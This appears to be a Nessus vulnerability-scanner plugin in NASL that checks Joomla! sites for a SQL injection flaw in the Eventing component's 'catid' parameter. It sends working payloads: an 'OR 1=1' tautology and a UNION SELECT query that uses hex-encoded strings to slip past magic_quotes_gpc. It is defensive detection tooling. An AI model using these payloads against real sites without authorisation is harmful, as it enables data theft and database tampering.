#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35435);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-0421");
  script_bugtraq_id(33296);
  script_osvdb_id(51376);
  script_xref(name:"EDB-ID", value:"7793");

  script_name(english:"Eventing Component for Joomla! 'catid' Parameter SQLi");
  script_summary(english:"Attempts to manipulate SQL queries.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Eventing component for Joomla! running on the
remote host is affected by a SQL injection vulnerability in
eventing.php due to improper sanitization of user-supplied input to
the 'catid' parameter before using it to construct database queries.
Regardless of the PHP 'magic_quotes_gpc' setting, an unauthenticated,
remote attacker can exploit this issue to manipulate database queries,
resulting in disclosure of sensitive information, modification of
data, or other attacks against the underlying database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/01/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Eventing";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('eventscalendar');
  checks["/components/com_eventing/eventing.css"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to list all events using a random category id.
catid = unixtime();
exploit = catid + " OR 1=1";
url = dir + "/index.php?option=com_eventing&catid=" + exploit;
url = str_replace(find:" ", replace:"%20", string:url);

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# If it looks like Eventing...
if ('com_eventing' >< res[2])
{
  # If we see did not see any results...
  if ('onmouseout="return nd();"' >!< res[2])
  {
    # Try a different exploit that works even if there are no events,
    # although it does require an older version of MySQL.
    #
    # nb: this creates an entry for the current day with the name of the plugin.
    exploit = catid + " UNION SELECT 1,2," + hexify(str:SCRIPT_NAME) + ",4," +
       hexify(str:'yesterday') + "," + hexify(str:'today') + ",7,8,9,10/*";
    url = dir + "/index.php?option=com_eventing&catid=" + exploit;
    url = str_replace(find:" ", replace:"%20", string:url);

    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
  }

  # There's a problem if we see some events.
  if (
    '<td class="eventday">' >< res[2] &&
    'onmouseout="return nd();"' >< res[2]
  )
  {
    output = strstr(res[2], '<td class="eventday">');
    if (empty_or_null(output)) output = res[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      sqli        : TRUE,
      request     : make_list(build_url(port:port, qs:url)),
      output      : output
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
